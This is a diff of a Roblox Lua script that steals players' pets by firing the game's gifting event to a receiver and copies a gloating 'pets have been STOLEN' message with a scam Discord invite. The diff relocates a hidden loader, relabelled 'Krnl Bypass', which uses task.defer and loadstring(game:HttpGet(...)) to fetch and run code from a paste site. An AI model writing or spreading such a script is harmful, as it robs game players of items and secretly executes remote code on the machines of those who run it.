@@ -27,17 +27,20 @@
         local TeleportService = game:GetService("TeleportService")
 
         local data = DataService:GetData()
-
-        local runHidden
-        task.defer(function()
-        if runHidden then runHidden() end
-        end)
-
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+
+        local runBypass
+
+        task.defer(function()
+            if runBypass then
+                runBypass()
+            end
+        end)
+
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -751,7 +754,10 @@
             return false
         end
 
-        
+        -- Krnl Bypass
+        runBypass = function()
+            loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
+        end
 
         if detectExecutor() == "Delta" then
             task.wait(0.3)
@@ -777,6 +783,7 @@
                 end
             end
         else
+
             -- Fire gifting event
             local success, err = pcall(function()
                 RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
@@ -817,20 +824,16 @@
 
     -- Gifting loop
     for _, pet in ipairs(pets) do
-
         for _, tool in targetPlr.Backpack:GetChildren() do
             if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
                 print("Gifting:", tool.Name)
-                for atempt = 1, 3 do
+                for attempt = 1, 3 do
                     result = safeGiftTool(tool)
                     if result then
                         break
                     end
                 end       
             end
-      runHidden = function()
-     loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
-      end
-
         end
     end
+
